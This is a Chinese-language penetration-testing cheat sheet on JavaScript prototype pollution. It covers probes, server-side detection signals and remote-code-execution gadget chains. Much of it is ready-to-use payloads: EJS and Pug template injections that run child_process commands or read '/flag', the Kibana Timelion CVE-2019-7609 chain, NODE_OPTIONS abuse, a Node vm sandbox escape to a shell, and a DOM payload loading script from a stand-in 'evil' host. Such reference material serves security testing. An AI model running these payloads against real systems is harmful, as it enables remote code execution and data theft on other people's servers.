# JavaScript 原型污染专题

> `__proto__`/`constructor.prototype` 探针、服务端黑盒信号表、RCE gadget 链。
> 相邻：DOM Clobbering 见 xss-advanced.md §5；EJS 等模板引擎本身见 ssti.md。

---

## 1. 机制

`obj.key` 无自有属性时沿 `[[Prototype]]` 上溯到 `Object.prototype`。解析器把字面键 `__proto__` 当魔法路径——`{"__proto__":{"x":1}}` 等价 `Object.prototype.x=1`（视实现/补丁）。`constructor.prototype` 是等价替代路径（绕只滤 `__proto__` 的校验），**两条都要测**。

**优先信号**：目标用 `lodash.merge`/`deep-extend`/`hoek.applyToDefaults`/部分 qs 配置。**入口**：深合并、递归 assign、`JSON.parse`+`Object.assign`、URL 查询转嵌套对象、GraphQL variables、YAML→JSON。

## 2. 检测探针

**客户端**（fragment）：`#__proto__[polluted]=1`｜`#__proto__[xxx]=alert(1)`｜`#constructor[prototype][polluted]=1`；DOM 注入 `__proto__[src]=//evil/xss.js`、`__proto__[onerror]=alert(1)`。验证：无 fragment 新页 console 查 `Object.prototype` 残留。

**服务端**（JSON）：`{"__proto__":{"polluted":true}}` / `{"constructor":{"prototype":{"polluted":true}}}`。黑盒**全局副作用**信号表：

| 污染键 | 信号 |
|---|---|
| `parameterLimit=1` | 后续多参数解析被忽略（qs） |
| `ignoreQueryPrefix=true` | `??foo=bar` 被接受 |
| `allowDots=true` | `?foo.bar=baz` 点号嵌套展开 |
| `json spaces=" "` | JSON 响应多空格 |
| `exposedHeaders=["foo"]` | CORS 响应含 foo 头 |
| `status=510` | 响应状态异常 |

先污染再发干净请求看持久性；连接池/worker 影响可见性。

## 3. RCE Gadget 链

| 目标 | Payload | 说明 |
|---|---|---|
| EJS | `{"__proto__":{"client":1,"escapeFunction":"JSON.stringify; process.mainModule.require('child_process').exec('CMD')"}}` | escapeFunction 从污染原型读取 → RCE（版本/配置依赖） |
| Timelion (CVE-2019-7609) | `.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("CMD")')` | Kibana PP+表达式链 |
| child_process | 污染 `shell`/`argv0`/`env`/`NODE_OPTIONS` | 后续 spawn/fork 从原型链读选项 |

**链式思维**：污染 → 依赖读 `obj.settings.xxx` 无 `hasOwnProperty` 检查 → RCE/SSRF/穿越。无 gadget 时按 DoS/逻辑漏洞报。

**Gadget 增补**:
| 目标 | Payload/要点 |
|------|------|
| flatnest（source，CVE-2023-26135 全版本） | insert() 拦 __proto__ 但 seek() 解析 `"[Circular (constructor.prototype)]"` 无检查——值字段填循环引用标记+后续点路径键直达 Object.prototype |
| Happy-DOM v20.x（gadget） | Window 构造器 `settings: options?.settings` 落原型链——污染 `settings.enableJavaScriptEvaluation` 重开 JS 求值；`document.write()` 的 parser 自带 evaluateScripts:true，脚本经 VM 执行 |
| Pug（AST 注入） | 污染 `Object.prototype.block` = {type:"Text", line:"1;pug_html+=global.process.mainModule.require('fs').readFileSync('/flag').toString();//", val:"x"}——Pug 在 AST 节点查 block 属性沿原型链命中，编译期代码注入（Lodash<4.17.5 _.merge 常见 source） |
| Node vm 逃逸（RCE 终点） | CommonJS: `this.constructor.constructor`("return process")().mainModule.require("child_process")；ESM 无 mainModule 用 `proc.binding("spawn_sync").spawn({file:"/bin/sh",...})`。CVE-2025-61927= happy-dom ≤19 默认开 JS 求值的实例（v20 默认关）。vm 不是安全边界；高危: happy-dom<20/vm2(废)/realms-shim |

**工具**：pp-finder（找 merge 点）｜yuske/server-side-prototype-pollution｜BlackFan/client-side-prototype-pollution（payload 集）｜PPScan。

## 4. Gadget 总表与利用链选择

服务端: **EJS outputFunctionName**（"x;process.mainModule.require('child_process').execSync('CMD');s"，res.render 触发，首选）/ Pug block 注入/ Handlebars type=Program 或 allowProto*ByDefault=true（4.6+）/ Nunjucks type=Code; **Node 通用 RCE**: {"__proto__":{"shell":"node","NODE_OPTIONS":"--require /proc/self/cmdline"}}（child_process 六属性 shell/NODE_OPTIONS/argv0/env/input/stdio）; Fastify rewriteUrl 绕访问控制。客户端: jQuery $.extend(true) sink→innerHTML gadget / Lodash _.merge sink→sourceURL+_.template 触发 / Vue template/render / Angular $parent。构建期: Webpack output.library/devtool（CI/CD 链）。污染入口库: minimist<1.2.6（CLI --__proto__.x）/ qs<6.0.4（?__proto__[x]=）/ destr·json5 旧版。
